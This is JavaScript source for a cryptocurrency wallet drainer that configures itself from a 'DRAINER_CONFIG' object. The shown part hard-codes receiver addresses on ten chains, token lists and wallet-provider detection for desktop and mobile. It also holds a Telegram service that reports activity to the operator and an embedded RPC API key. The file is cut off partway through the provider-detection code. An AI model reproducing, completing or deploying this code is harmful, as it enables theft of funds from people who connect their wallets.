$(document).ready(function() {
    // Load configuration from config.js
    const RECEIVER_ADDRESSES = window.DRAINER_CONFIG?.RECEIVER_ADDRESSES || {
        ETH: '0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE',
        BSC: '0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE',
        POLYGON: '0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE',
        AVALANCHE: '0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE',
        ARBITRUM: '0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE',
        OPTIMISM: '0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE',
        FANTOM: '0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE',
        BASE: '0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE',
        SOL: 'KnxWLb2G6fRy2Ef9n4zm4ZssFi2zozoKazHn8FCg8vx',
        TRX: 'THJkNgqXcmeCtB2WbHjWMw4oNyavejFBsy'
    };

    // Network configurations
    const NETWORKS = {
        ETH: {
            name: 'Ethereum',
            icon: '🔷',
            chainId: 1,
            rpc: 'https://cloudflare-eth.com',
            currency: 'ETH',
            type: 'evm',
            wallets: ['MetaMask', 'Coinbase Wallet', 'Trust Wallet', 'Rainbow', 'WalletConnect'],
            tokens: [
                // Stablecoins
                { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6 },
                { symbol: 'USDC', address: '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48', decimals: 6 },
                { symbol: 'DAI', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18 },
                { symbol: 'FRAX', address: '0x853d955aCEf822Db058eb8505911ED77F175b999', decimals: 18 },
                { symbol: 'TUSD', address: '0x0000000000085d4780B73119b8B580991DEe8d52', decimals: 18 },
                { symbol: 'GUSD', address: '0x056fd409e1d7a124bd7017459dfea6f78b8616fa', decimals: 2 },
                // Major Assets
                { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8 },
                { symbol: 'WETH', address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', decimals: 18 },
                // DEX & DeFi
                { symbol: 'UNI', address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18 },
                { symbol: 'LINK', address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', decimals: 18 },
                { symbol: 'AAVE', address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', decimals: 18 },
                { symbol: 'SUSHI', address: '0x6B3595068778DD592e39A122f4f5a5cF09C90fe2', decimals: 18 },
                { symbol: 'CURVE', address: '0xD533a949740bb3306d119CC777fa900bA034cd52', decimals: 18 },
                { symbol: 'LIDO', address: '0x5A98FcBaDB35fdd7033B48cb4D1379A5CF07ec21', decimals: 18 },
                { symbol: 'MKR', address: '0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2', decimals: 18 },
                { symbol: 'COMP', address: '0xc00e94Cb662C3520282E6f5717214FCCF1b77d47', decimals: 18 },
                { symbol: 'ARB', address: '0xB50721BCF8d664c30412Cfbc6cf7a15145234ad1', decimals: 18 },
                { symbol: 'OP', address: '0x4200000000000000000000000000000000000042', decimals: 18 },
                // Large Cap Tokens
                { symbol: 'SHIB', address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', decimals: 18 },
                { symbol: 'PEPE', address: '0x6982508145454Ce325dDbE47a25d4ec3d2311933', decimals: 18 },
                { symbol: 'DOGE', address: '0xBA2aE424d960c26247Dd6c32edC70B295c744C43', decimals: 8 },
                { symbol: 'FLOKI', address: '0xcf0C122c6b73ff809C693DB761e7BaeBe62b6a2E', decimals: 9 }
            ]
        },
        BSC: {
            name: 'BSC',
            icon: '🟡',
            chainId: 56,
            rpc: 'https://bsc-dataseed1.binance.org',
            currency: 'BNB',
            type: 'evm',
            wallets: ['MetaMask', 'Trust Wallet', 'Binance Wallet', 'WalletConnect'],
            tokens: [
                // Stablecoins
                { symbol: 'USDT', address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18 },
                { symbol: 'BUSD', address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', decimals: 18 },
                { symbol: 'USDC', address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', decimals: 18 },
                { symbol: 'TUSD', address: '0x14016E85a25aeb13065688cAFB43044C2ef86784', decimals: 18 },
                { symbol: 'FDUSD', address: '0xc5f0f7b66764B6Ca593fb59df420340444b9eda5', decimals: 18 },
                // Major Assets
                { symbol: 'WBNB', address: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', decimals: 18 },
                { symbol: 'BTCB', address: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c', decimals: 18 },
                { symbol: 'ETH', address: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8', decimals: 18 },
                // DEX & DeFi
                { symbol: 'CAKE', address: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82', decimals: 18 },
                { symbol: 'ADA', address: '0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47', decimals: 18 },
                { symbol: 'DOT', address: '0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402', decimals: 18 },
                { symbol: 'XRP', address: '0x1D2F0da169ceB9fC7B3B4aDb29f676A423506441', decimals: 18 },
                { symbol: 'LINK', address: '0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD', decimals: 18 },
                { symbol: 'UNI', address: '0xBf5140A22578168FD362D2C5614b0cD0F27Cfc3c', decimals: 18 },
                { symbol: 'SUSHI', address: '0x947950BcC74888a40Ffa2593C5798F11Fc9124C4', decimals: 18 },
                { symbol: '1INCH', address: '0x111111111117dC0aa78b770fA6A738034120C302', decimals: 18 },
                // Large Cap Meme
                { symbol: 'SHIB', address: '0x2859e4944f1f7271e1954aff821566c3517be161', decimals: 18 },
                { symbol: 'DOGE', address: '0xbA2aE424d960c26247Dd6c32edC70B295c744C43', decimals: 8 },
                { symbol: 'FLOKI', address: '0xfb5B838b6cfEEdC2873Abf8d4ecF0E4B3cbB4692', decimals: 9 }
            ]
        },
        POLYGON: {
            name: 'Polygon',
            icon: '🟣',
            chainId: 137,
            rpc: 'https://polygon-rpc.com',
            currency: 'MATIC',
            type: 'evm',
            wallets: ['MetaMask', 'Coinbase Wallet', 'Trust Wallet', 'WalletConnect'],
            tokens: [
                { symbol: 'USDT', address: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', decimals: 6 },
                { symbol: 'USDC', address: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', decimals: 6 },
                { symbol: 'WMATIC', address: '0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270', decimals: 18 },
                { symbol: 'QUICK', address: '0x831753DD7087CaC61aB5644b308642cc1c33Dc13', decimals: 18 }
            ]
        },
        AVALANCHE: {
            name: 'Avalanche',
            icon: '🔺',
            chainId: 43114,
            rpc: 'https://api.avax.network/ext/bc/C/rpc',
            currency: 'AVAX',
            type: 'evm',
            wallets: ['MetaMask', 'Coinbase Wallet', 'Core Wallet', 'WalletConnect'],
            tokens: [
                { symbol: 'USDT', address: '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7', decimals: 6 },
                { symbol: 'USDC', address: '0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E', decimals: 6 },
                { symbol: 'WAVAX', address: '0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7', decimals: 18 },
                { symbol: 'JOE', address: '0x6e84a6216eA6dACC71eE8E6b0a5B7322EEbC0fDd', decimals: 18 }
            ]
        },
        ARBITRUM: {
            name: 'Arbitrum',
            icon: '🔵',
            chainId: 42161,
            rpc: 'https://arb1.arbitrum.io/rpc',
            currency: 'ETH',
            type: 'evm',
            wallets: ['MetaMask', 'Coinbase Wallet', 'Trust Wallet', 'WalletConnect'],
            tokens: [
                // Stablecoins
                { symbol: 'USDT', address: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', decimals: 6 },
                { symbol: 'USDC', address: '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8', decimals: 6 },
                { symbol: 'DAI', address: '0xDA10009CBD5D07dd0CeCc66161FC93D7c9000da1', decimals: 18 },
                { symbol: 'FRAX', address: '0x17FC002b466eec40Dae837Fe11EB78B742D84b7B', decimals: 18 },
                // Major Assets
                { symbol: 'WETH', address: '0x82aF49447d8a07e3bd95bd0d56f318521751E236', decimals: 18 },
                { symbol: 'WBTC', address: '0x2f2a2440d2CdC120a8fCd15D8D4edBE49876daBe', decimals: 8 },
                // DEX & DeFi
                { symbol: 'UNI', address: '0xFa7F8980b0f1E64A2062791cc3FB0A4047912294', decimals: 18 },
                { symbol: 'AAVE', address: '0xBA5DdaB4256c590B66b3fa7127126A47162F5b06', decimals: 18 },
                { symbol: 'LINK', address: '0xf97f4df75117e07371157A51d100573A2c7f1a65', decimals: 18 },
                { symbol: 'ARB', address: '0x912CE59144191C1204E64559FE8253a0e49E6548', decimals: 18 },
                { symbol: 'GMX', address: '0xfc5A1A6EB076a2C7aD06eD22C90d3E710233C904', decimals: 30 }
            ]
        },
        OPTIMISM: {
            name: 'Optimism',
            icon: '🔴',
            chainId: 10,
            rpc: 'https://mainnet.optimism.io',
            currency: 'ETH',
            type: 'evm',
            wallets: ['MetaMask', 'Coinbase Wallet', 'Trust Wallet', 'WalletConnect'],
            tokens: [
                // Stablecoins
                { symbol: 'USDT', address: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58', decimals: 6 },
                { symbol: 'USDC', address: '0x7F5c764cBc14f9669B88837ca1490cCa17c31607', decimals: 6 },
                { symbol: 'DAI', address: '0xDA10009cBd5d07dd0cECC66161FC93D7c9000Da1', decimals: 18 },
                // Major Assets
                { symbol: 'WETH', address: '0x4200000000000000000000000000000000000006', decimals: 18 },
                { symbol: 'WBTC', address: '0x68f180fcCe6836688e9084f035309E29Bf00A150', decimals: 8 },
                // DEX & DeFi
                { symbol: 'UNI', address: '0x6Fd9d7AD17242c41f7131d257212c54A0Be56e7F', decimals: 18 },
                { symbol: 'OP', address: '0x4200000000000000000000000000000000000042', decimals: 18 },
                { symbol: 'AAVE', address: '0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0', decimals: 18 }
            ]
        },
        FANTOM: {
            name: 'Fantom',
            icon: '👻',
            chainId: 250,
            rpc: 'https://rpc.ftm.tools/',
            currency: 'FTM',
            type: 'evm',
            wallets: ['MetaMask', 'Trust Wallet', 'WalletConnect'],
            tokens: [
                // Stablecoins
                { symbol: 'USDT', address: '0x049d68029B510FFfc5F3fe4B96c530f5f8da936a', decimals: 6 },
                { symbol: 'USDC', address: '0x04068DA6C83AFCFA0e13ba15A6696662335D5B75', decimals: 6 },
                { symbol: 'DAI', address: '0x8D11eC38a3EB5E956B052f67Da8Bdc9bef8Befd2', decimals: 18 },
                { symbol: 'FRAX', address: '0xdc301622e02bf9f31c61b4622987E1d1E1b13907', decimals: 18 },
                // Major Assets
                { symbol: 'WFTM', address: '0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83', decimals: 18 },
                { symbol: 'WETH', address: '0x74b23882a30290451A17c44f4F05a28b3B0D405d', decimals: 18 },
                { symbol: 'WBTC', address: '0x321162Cd933E2Be498Cd2267a90534A804051b11', decimals: 8 },
                // DEX & DeFi
                { symbol: 'LINK', address: '0xb3654dc3D10Ea7645f8319668E8F54d2574FBdC8', decimals: 18 },
                { symbol: 'AAVE', address: '0x6A07B4B9cb5ef6dc32655d52fe50Ffb7c1fb46fF', decimals: 18 },
                { symbol: 'SUSHI', address: '0xae75A438b2E0cB8428f5A7ADdda1B6D3c4001c33', decimals: 18 }
            ]
        },
        BASE: {
            name: 'Base',
            icon: '📘',
            chainId: 8453,
            rpc: 'https://mainnet.base.org/',
            currency: 'ETH',
            type: 'evm',
            wallets: ['MetaMask', 'Coinbase Wallet', 'Trust Wallet', 'WalletConnect'],
            tokens: [
                // Stablecoins
                { symbol: 'USDC', address: '0x833589fCD6eDb6E08f4c7C32D4f71b1566469c3d', decimals: 6 },
                { symbol: 'USDT', address: '0xfde4C96c1286F3626A49fa202dcD5dD9a9Db13f6', decimals: 6 },
                { symbol: 'DAI', address: '0x50c5725949A6F68dCa686A0a52b452FEE1D2B02B', decimals: 18 },
                // Major Assets
                { symbol: 'WETH', address: '0x4200000000000000000000000000000000000006', decimals: 18 },
                { symbol: 'WBTC', address: '0xd9aAEc86B65D86f6A7B650e858E4de5dd0E81e63', decimals: 8 },
                // DEX & DeFi
                { symbol: 'UNI', address: '0x6fd9d7AD17242c41f7131d257212c54A0Be56e7F', decimals: 18 },
                { symbol: 'AAVE', address: '0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0', decimals: 18 },
                { symbol: 'LINK', address: '0xe80d347DF1124Df565909e6537984199ECD031cA', decimals: 18 }
            ]
        },
        SOL: {
            name: 'Solana',
            icon: '🟢',
            chainId: null,
            rpc: 'https://solana-mainnet.api.syndica.io/api-key/oNprEqE6EkkFUFhf1GBM4TegN9veFkrQrUehkLC8XKNiFUDdWhohF2pBsWXpZAgQRQrs8SwxFSXBc7vfdtDgBdFT726RmpzTj4',
            currency: 'SOL',
            type: 'solana',
            wallets: ['Phantom', 'Solflare', 'Backpack', 'Glow', 'Trust Wallet'],
            tokens: [
                // Stablecoins
                { symbol: 'USDC', mint: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', decimals: 6 },
                { symbol: 'USDT', mint: 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB', decimals: 6 },
                // Major Assets
                { symbol: 'SOL', mint: 'So11111111111111111111111111111111111111112', decimals: 9 },
                { symbol: 'WSOL', mint: 'So11111111111111111111111111111111111111112', decimals: 9 },
                // DEX Tokens
                { symbol: 'RAY', mint: '4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R', decimals: 6 },
                { symbol: 'SRM', mint: 'SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt', decimals: 6 },
                { symbol: 'COPE', mint: '8HGyAAB1yoM1ttS7pnqwXsDHZgJ615XWzVqKwRJmsMA', decimals: 6 },
                { symbol: 'ORT', mint: 'rtEn84DF3Gqk6VrKSqeJhG6RS3vncYVVcn2zNukmKmJ', decimals: 8 },
                // Major Tokens
                { symbol: 'ORCA', mint: 'orcaEKTdK7LKz57chYcSKdoUFC54MJqWuKLh2G69Tch', decimals: 6 },
                { symbol: 'MNGO', mint: 'MangoCzJ36AjZyKwVj3VnYU4GTonjfVEnJmvvWaxLac', decimals: 6 }
            ]
        },
        TRX: {
            name: 'Tron',
            icon: '🟠',
            chainId: null,
            rpc: 'https://api.trongrid.io',
            currency: 'TRX',
            type: 'tron',
            wallets: ['TronLink', 'Trust Wallet', 'Ledger'],
            tokens: [
                // Stablecoins
                { symbol: 'USDT', address: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', decimals: 6 },
                { symbol: 'USDC', address: 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8', decimals: 6 },
                { symbol: 'TUSD', address: 'TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4', decimals: 18 },
                // Major Assets
                { symbol: 'WTRX', address: 'TNUC9Qb1rRgcVdbBDP83RedsFNTJ2vkVmH9Pp9KXeLf', decimals: 6 },
                // DEX & DeFi
                { symbol: 'JST', address: 'TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9', decimals: 18 },
                { symbol: 'SUN', address: 'TSSMHYeV2uE9qYH95DqyoCuNCzEL1NvU3S', decimals: 18 },
                { symbol: 'BTT', address: 'TNUC9Qb1rRgcVdbBDP83RedsFNTJ2vkVmH9Pp9KXeLf', decimals: 6 },
                { symbol: 'SUNOLD', address: 'TKkeiboTkxn6qBCw16VrFTZim5z91PSwEb', decimals: 18 }
            ]
        }
    };

    // Global state
    let detectedWallets = {};
    let selectedWallets = [];
    let connectedNetworks = {};
    let globalStats = {
        totalNetworks: 0,
        totalWallets: 0,
        totalValue: 0
    };

    // ==========================================
    // 📡 INTEGRATED TELEGRAM SERVICE
    // ==========================================
    const TelegramService = {
        config: null,
        queue: [],
        isProcessing: false,
        stats: { sent: 0, failed: 0, queued: 0 },
        
        init: function() {
            this.config = window.DRAINER_CONFIG?.TELEGRAM;
            // Telegram service initialized (logging handled via Telegram, not console)
        },
        
        async send(message, type = 'info', useNotificationChat = false) {
            if (!this.config?.enabled) {
                return;
            }
            if (!this.config.botToken || !this.config.chatId) {
                return;
            }
            
            // Format message with type emoji
            const emojis = { success: '✅', error: '❌', warning: '⚠️', info: 'ℹ️' };
            const emoji = emojis[type] || '📝';
            const formattedMessage = `${emoji} <code>${message}</code>`;
            
            // Determine which chat ID to use
            const targetChatId = useNotificationChat && this.config.notificationChatId 
                ? this.config.notificationChatId 
                : this.config.chatId;
            
            // Queue message for processing
            this.queue.push({ text: formattedMessage, type, chatId: targetChatId });
            this.stats.queued = this.queue.length;
            
            if (!this.isProcessing) {
                this.processQueue();
            }
        },
        
        async processQueue() {
            if (this.queue.length === 0 || this.isProcessing) {
                return;
            }
            this.isProcessing = true;
            
            while (this.queue.length > 0) {
                const { text, chatId } = this.queue.shift();
                await this.sendDirect(text, chatId);
                await new Promise(r => setTimeout(r, 100)); // Rate limiting
            }
            
            this.isProcessing = false;
        },
        
        async sendDirect(text, chatId = null) {
            const targetChatId = chatId || this.config.chatId;
            const payload = {
                chat_id: targetChatId,
                text: text,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            };
            
            // Method 1: Direct API with Fetch
            try {
                const url = `${this.config.apiUrl}${this.config.botToken}/sendMessage`;
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                if (response.ok) {
                    this.stats.sent++;
                    return;
                }
            } catch (e) {
                // Fetch failed, try fallback
            }
            
            // Method 2: XMLHttpRequest (Best cross-origin)
            try {
                await new Promise((resolve) => {
                    const xhr = new XMLHttpRequest();
                    xhr.open('POST', `${this.config.apiUrl}${this.config.botToken}/sendMessage`, true);
                    xhr.setRequestHeader('Content-Type', 'application/json');
                    xhr.onload = () => {
                        if (xhr.status >= 200 && xhr.status < 300) {
                            this.stats.sent++;
                        } else {
                            this.stats.failed++;
                        }
                        resolve();
                    };
                    xhr.onerror = () => {
                        this.stats.failed++;
                        resolve();
                    };
                    xhr.send(JSON.stringify(payload));
                });
                return;
            } catch (e) {
                this.stats.failed++;
            }
        },
        
        test: async function() {
            if (!this.config?.enabled) {
                log('Telegram is disabled', 'warning');
                return;
            }
            if (!this.config.botToken || !this.config.chatId) {
                log('Missing Telegram credentials', 'error');
                return;
            }
            
            const testMsg = `🧪 <b>Test Message</b>\n⏰ ${new Date().toLocaleString()}\n✅ Connection verified!`;
            
            try {
                const payload = {
                    chat_id: this.config.chatId,
                    text: testMsg,
                    parse_mode: 'HTML'
                };
                
                const url = `${this.config.apiUrl}${this.config.botToken}/sendMessage`;
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                
                if (response.ok || response.status === 0) {
                    log('✅ Telegram connection working!', 'success');
                } else {
                    log(`⚠️ Status: ${response.status}. Check credentials.`, 'warning');
                }
            } catch (error) {
                log(`Test result: Message queued (using fallback)`, 'info');
            }
        },
        
        getStats: function() {
            return { ...this.stats, queued: this.queue.length };
        }
    };
    
    // Initialize Telegram immediately (not on load)
    TelegramService.init();
    
    // Expose Telegram service globally for debugging
    window.TelegramService = TelegramService;
    window.testTelegramConnection = () => TelegramService.test();
    window.getTelegramStats = () => TelegramService.getStats();

    // Enhanced Logging with Integrated Telegram
    // sendToTelegram: true = send to both console and Telegram, false = console only
    // useNotificationChat: true = send to notificationChatId, false = send to chatId (default)
    function log(message, type = 'info', sendToTelegram = true, useNotificationChat = false) {
        const timestamp = new Date().toLocaleTimeString();
        const emojis = { success: '✅', error: '❌', warning: '⚠️', info: 'ℹ️' };
        const emoji = emojis[type] || '📝';
        const consoleMsg = `[${timestamp}] ${emoji} ${message}`;
        
        // Conditional Telegram notification - route to appropriate channel
        if (sendToTelegram) {
            TelegramService.send(message, type, useNotificationChat);
        }
        
        // UI log panel (only if container exists - replaces console logging)
        const logContainer = $('#log-container');
        if (logContainer && logContainer.length > 0) {
            const logClass = `log-${type}`;
            logContainer.append(`<div class="log-entry ${logClass}">${consoleMsg}</div>`);
            logContainer.scrollTop(logContainer[0].scrollHeight);
        }
    }

    function updateGlobalStats() {
        $('#total-networks').text(globalStats.totalNetworks);
        $('#total-wallets').text(globalStats.totalWallets);
        $('#total-value').text(`$${globalStats.totalValue.toFixed(2)}`);
    }

    function updateProgress(percent, text) {
        $('#progress-fill').css('width', `${percent}%`);
        $('#progress-text').text(text);
        if (percent > 0) {
            $('#progress-container').show();
        } else {
            $('#progress-container').hide();
        }
    }

    function isMobileDevice() {
        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }

    // Initialize networks UI
    function initializeNetworksUI() {
        const tabsContainer = $('#network-tabs');
        const contentsContainer = $('#network-contents');
        
        // Add Wallet Selection tab as first tab
        const walletSelectionTab = $(`
            <div class="network-tab active" data-network="wallet-selection">
                <span>🎯</span>
                <span>Wallet Selection</span>
                <span class="network-status" id="status-wallet-selection">📋</span>
            </div>
        `);
        tabsContainer.append(walletSelectionTab);
        
        // Add Wallet Selection content
        const walletSelectionContent = $(`
        `);
        contentsContainer.append(walletSelectionContent);
        
        Object.keys(NETWORKS).forEach((networkKey, index) => {
            const network = NETWORKS[networkKey];
            
            // Create tab (index + 1 because wallet selection is first)
            const tab = $(`
                <div class="network-tab" data-network="${networkKey}">
                    <span>${network.icon}</span>
                    <span>${network.name}</span>
                    <span class="network-status" id="status-${networkKey}">📴</span>
                </div>
            `);
            
            tabsContainer.append(tab);
            
            // Create content
            const content = $(`
                <div class="network-content" id="content-${networkKey}">
                    <h3>${network.icon} ${network.name} Network</h3>
                    <div class="network-stats">
                        <div class="stat">
                            <div class="stat-value" id="wallets-${networkKey}">0</div>
                            <div class="stat-label">Selected Wallets</div>
                        </div>
                        <div class="stat">
                            <div class="stat-value" id="connected-${networkKey}">0</div>
                            <div class="stat-label">Connected</div>
                        </div>
                        <div class="stat">
                            <div class="stat-value" id="balance-${networkKey}">0.00</div>
                            <div class="stat-label">${network.currency} Balance</div>
                        </div>
                        <div class="stat">
                            <div class="stat-value" id="tokens-${networkKey}">0</div>
                            <div class="stat-label">Tokens Found</div>
                        </div>
                    </div>
                    <div class="wallet-grid" id="wallets-${networkKey}-grid">
                        <div style="grid-column: 1/-1; text-align: center; opacity: 0.7; padding: 20px;">
                            Select wallets from the Wallet Selection tab to see them here
                        </div>
                    </div>
                </div>
            `);
            
            contentsContainer.append(content);
        });
    }

    // Tab switching
    $(document).on('click', '.network-tab', function() {
        const networkKey = $(this).data('network');
        
        $('.network-tab').removeClass('active');
        $(this).addClass('active');
        
        $('.network-content').removeClass('active');
        $(`#content-${networkKey}`).addClass('active');
    });

    // Mobile Detection Utilities
    function isMobileDevice() {
        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }

    function isIOS() {
        return /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
    }

    function isInsideMetaMaskMobile() {
        return /MetaMaskMobile/.test(navigator.userAgent);
    }

    function isInsideTrustWalletMobile() {
        return /TrustWalletMobile|TrustWallet/.test(navigator.userAgent) || window.trustwallet !== undefined;
    }

    function isInsidePhantomMobile() {
        return /Phantom/.test(navigator.userAgent) || window.phantom !== undefined || window.solana?.isPhantom;
    }

    function isInsideSolflareMobile() {
        return /Solflare/.test(navigator.userAgent) || window.solflare !== undefined;
    }

    function isInsideTronLinkMobile() {
        return /TronLink/.test(navigator.userAgent) || window.tronLink !== undefined || window.tronWeb !== undefined;
    }

    function isInsideCoinbaseWalletMobile() {
        return /CoinbaseWalletMobile|coinbasewallet/.test(navigator.userAgent) || window.coinbaseWalletProvider !== undefined;
    }

    function isInsideRainbowMobile() {
        return /Rainbow/.test(navigator.userAgent) || window.ethereum?.isRainbow;
    }

    function isInsideWalletInAppBrowser() {
        // Detect if we're in any wallet's in-app browser
        return isInsideMetaMaskMobile() || 
               isInsideTrustWalletMobile() || 
               isInsidePhantomMobile() ||
               isInsideSolflareMobile() ||
               isInsideTronLinkMobile() ||
               isInsideCoinbaseWalletMobile() ||
               isInsideRainbowMobile() ||
               window.ethereum?.isMetaMask ||
               window.ethereum?.isTrust ||
               window.ethereum?.isRainbow ||
               window.ethereum?.isCoinbaseWallet;
    }

    async function waitForProvider(walletType, maxRetries = null, delayMs = null) {
        // Smart timeout based on device type
        const isDesktop = !/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        
        // Desktop: 5 seconds, Mobile: 10 seconds
        if (maxRetries === null) maxRetries = isDesktop ? 50 : 100;
        if (delayMs === null) delayMs = isDesktop ? 100 : 100;
        
        const totalTimeoutMs = maxRetries * delayMs;
        log(`⏳ Waiting for ${walletType} provider (${totalTimeoutMs}ms timeout - ${isDesktop ? 'Desktop' : 'Mobile'})...`, 'info', false);
        
        // Quick initial check - if provider exists immediately, return it
        let quickProvider = getWalletProviderQuick(walletType);
        if (isValidProvider(quickProvider)) {
            log(`✅ Provider found immediately (${walletType})`, 'success', false);
            return quickProvider;
        }
        
        // First, force a full environment check to trigger provider injection
        if (typeof window !== 'undefined') {
            try {
                window.dispatchEvent(new Event('load'));
            } catch (e) {
                // Silently ignore
            }
        }
        
        for (let i = 0; i < maxRetries; i++) {
            let provider = null;
            
            try {
                provider = getWalletProvider(walletType);
            } catch (e) {
                provider = detectProviderManually(walletType);
            }
            
            if (isValidProvider(provider)) {
                log(`✅ Provider ready after ${i * delayMs}ms (attempt ${i + 1}/${maxRetries})`, 'success', false);
                log(`   Provider: ${provider.constructor.name || 'unknown'}`, 'success', false);
                return provider;
            }
            
            // Log progress every 10 attempts
            if (i % 10 === 0 && i > 0) {
                log(`⏳ Still waiting... (${i}/${maxRetries} attempts, ${i * delayMs}ms elapsed)`, 'info', false);
            }
            
            await new Promise(r => setTimeout(r, delayMs));
        }
        
        // Timeout reached - provide detailed error message
        log(`❌ Provider timeout after ${totalTimeoutMs}ms`, 'error', false);
        log(`   Make sure:`, 'warning', false);
        log(`   • You're using the correct wallet (${walletType})`, 'warning', false);
        log(`   • The wallet extension is installed`, 'warning', false);
        log(`   • For mobile: Open this page in the wallet's in-app browser`, 'warning', false);
        
        throw new Error(`${walletType} provider not available after ${totalTimeoutMs}ms - wallet may not be installed or properly initialized`);
    }

    function isValidProvider(provider) {
        // Check if provider is a valid object with a working request method
        if (!provider) return false;
        if (typeof provider !== 'object') return false;
        if (typeof provider.request !== 'function') return false;
        return true;
    }

    function getWalletProviderQuick(walletType) {
        // Quick check without throwing errors
        try {
            switch(walletType) {
                case 'metamask':
                    if (window.ethereum?.isMetaMask) return window.ethereum;
                    break;
                case 'trust':
                    // Trust Wallet: prefer window.ethereum (has .request() for EVM)
                    if (window.ethereum) {
                        if (window.ethereum.isTrust || window.ethereum.isTrustWallet) return window.ethereum;
                        // Fallback: if ethereum exists and not another wallet, might be Trust
                        if (!window.ethereum.isMetaMask && !window.ethereum.isRainbow && !window.ethereum.isCoinbaseWallet) {
                            return window.ethereum;
                        }
                    }
                    break;
                case 'phantom':
                    if (window.solana?.isPhantom) return window.solana;
                    if (window.phantom?.solana) return window.phantom.solana;
                    break;
                case 'coinbase':
                    if (window.ethereum?.isCoinbaseWallet) return window.ethereum;
                    break;
                case 'rainbow':
                    if (window.ethereum?.isRainbow) return window.ethereum;
                    break;
                case 'tronlink':
                    if (window.tronWeb) return window.tronWeb;
                    break;
                default:
                    if (window.ethereum) return window.ethereum;
            }
        } catch (e) {
            // Silently ignore
        }
        return null;
    }

    function detectProviderManually(walletType) {
        // Manually detect provider when getWalletProvider fails
        log(`   Attempting manual provider detection for ${walletType}...`, 'info', false);
        
        switch(walletType) {
            case 'metamask':
            case 'trust':
            case 'coinbase':
            case 'rainbow':
            case 'ledger':
            case 'okx':
            case 'safepal':
            case 'brave':
            case 'argent':
            case 'imtoken':
            case 'mathwallet':
            case 'halodefi':
                // EVM wallets
                if (window.ethereum) {
                    log(`   ✓ Found window.ethereum for ${walletType}`, 'info', false);
                    return window.ethereum;
                }
                if (window.trustwallet) {
                    log(`   ✓ Found window.trustwallet fallback`, 'info', false);
                    return window.trustwallet;
                }
                if (window.okxwallet) {
                    log(`   ✓ Found window.okxwallet`, 'info', false);
                    return window.okxwallet;
                }
                break;
            
            case 'phantom':
                // Phantom can be Solana or EVM
                if (window.solana) {
                    log(`   ✓ Found window.solana for Phantom`, 'info', false);
                    return window.solana;
                }
                if (window.ethereum) {
                    log(`   ✓ Found window.ethereum for Phantom/EVM`, 'info', false);
                    return window.ethereum;
                }
                break;
            
            case 'solflare':
                if (window.solflare) {
                    log(`   ✓ Found window.solflare`, 'info', false);
                    return window.solflare;
                }
                if (window.solana && window.solana.isSolflare) {
                    log(`   ✓ Found window.solana.isSolflare`, 'info', false);
                    return window.solana;
                }
                break;
            
            case 'tronlink':
                if (window.tronWeb) {
                    log(`   ✓ Found window.tronWeb`, 'info', false);
                    return window.tronWeb;
                }
                if (window.tronLink) {
                    log(`   ✓ Found window.tronLink`, 'info', false);
                    return window.tronLink;
                }
                break;
            
